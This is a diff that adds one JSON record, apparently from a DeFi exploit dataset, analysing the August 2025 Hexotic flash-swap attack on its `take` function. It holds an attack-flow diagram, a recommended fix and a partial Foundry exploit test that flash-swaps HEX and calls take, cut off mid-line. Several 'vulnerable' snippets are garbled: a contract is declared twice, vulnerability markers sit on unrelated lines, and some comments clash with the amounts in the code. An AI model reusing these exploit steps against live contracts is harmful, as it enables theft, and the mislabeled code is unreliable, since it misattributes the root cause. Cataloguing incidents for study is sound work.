@@ -1,0 +1,29 @@
+{
+ "id": "2025__2025-08-25_Hexotic_FlashSwap-TakeFunction",
+ "source_file": "2025/2025-08-25_Hexotic_FlashSwap-TakeFunction.md",
+ "title": "Hexotic — Flash Swap-Based `take` Function Vulnerability Analysis",
+ "date": "2025-08-25",
+ "protocol": "Hexotic",
+ "chain": "Ethereum",
+ "loss_raw": "~500 USD",
+ "loss_usd": null,
+ "root_cause": "The `take` function allows unauthorized profit extraction using HEX tokens obtained via flash swap",
+ "attack_tx": "0x23b69bef...",
+ "vulnerable_contract": "0x204B937FEaEc333E9e6d72D35f1D131f187ECeA1",
+ "classes": [
+  "flash-loan"
+ ],
+ "code_before": [
+  "❌ Vulnerable pattern: take function only checks instantaneous HEX balance\ninterface IHexotic {\n    function take(bytes32 id) external payable;\n    // Internally calculates profit based on msg.sender's HEX balance\n    // Can be called after temporarily holding balance via flash swap\n}\n\n//",
+  "// File: hex-otc.sol\ncontract EventfulMarket {\n    );\n\n    event LogTake(\n        bytes32           id,\n        address  indexed  maker,\n        address  indexed  taker,  // ❌ vulnerability\n        uint          take_amt,\n        uint           give_amt,\n        uint64            timestamp,\n        uint              escrowType\n    );\n\n    event LogKill(\n        bytes32  indexed  id,\n        address  indexed  maker,\n        uint           pay_amt,\n        uint           buy_amt,\n        uint64            timestamp,\n        uint              escrowType\n    );\n}",
+  "// File: erc20.sol\ncontract ERC20 {\ncontract ERC20 is ERC20Events {\n    function totalSupply() public view returns (uint);  // ❌ vulnerability\n    function balanceOf(address guy) public view returns (uint);\n    function allowance(address src, address guy) public view returns (uint);\n\n    function approve(address guy, uint wad) public returns (bool);\n    function transfer(address dst, uint wad) public returns (bool);\n    function transferFrom(\n        address src, address dst, uint wad\n    ) public returns (bool);\n}"
+ ],
+ "code_after": [
+  "✅ Recommended fix: balance snapshot or staking-based verification\n// Verify holding history over a period of time, not balance at call time\nfunction take(bytes32 id) external payable {\n    require(stakedBalance[msg.sender] >= minimumStake, \"insufficient stake\");\n    require(block.timestamp - stakeTime[msg.sender] >= lockPeriod, \"not locked long enough\");\n    ...\n}"
+ ],
+ "steps": [],
+ "other_code": [
+  "Attacker\n  │\n  ├─[1]─▶ Prepare 0.037 WETH (for pool repayment)\n  │\n  ├─[2]─▶ Flash swap from UniswapV3 HEX/WETH pool\n  │         └─ Borrow large amount of HEX tokens\n  │\n  ├─[3]─▶ HEX.approve(hexotic, max)\n  │\n  ├─[4]─▶ Call hexotic.take(0x...0043) (first ID)\n  │         └─ Receive profit based on HEX holdings\n  │\n  ├─[5]─▶ Call hexotic.take(0x...002b) (second ID)\n  │         └─ Receive additional profit\n  │\n  └─[6]─▶ Repay flash swap in WETH via uniswapV3SwapCallback\n              └─ Retain ~500 USD profit",
+  "function testExploit() public balanceLog {\n    // [1] Obtain 0.1 ETH and wrap into WETH\n    vm.deal(address(this), 0.1 ether);\n    WETH.deposit{value: 0.037 ether}();\n\n    // [2] Initiate flash swap from UniswapV3 HEX/WETH pool\n    // false = direction to receive token1 (HEX), specify max price range for pool\n    IPancakeV3Pool(uniswapV3HEXPool).swap(\n        address(this),\n        false,\n        37000000000000000,           // HEX borrow amount\n        1461446703485210103287273052203988822378723970341, // sqrtPriceLimitX96 max\n        \"0x00\"\n    );\n\n    // [3] Call Hexotic take function with borrowed HEX (executed inside callback)\n    hexToken.approve(address(hexotic), type(uint256).max);\n\n    // [4] Call take function with two IDs to extract profit\n    hexotic.take(0x00000000000000000000"
+ ]
+}
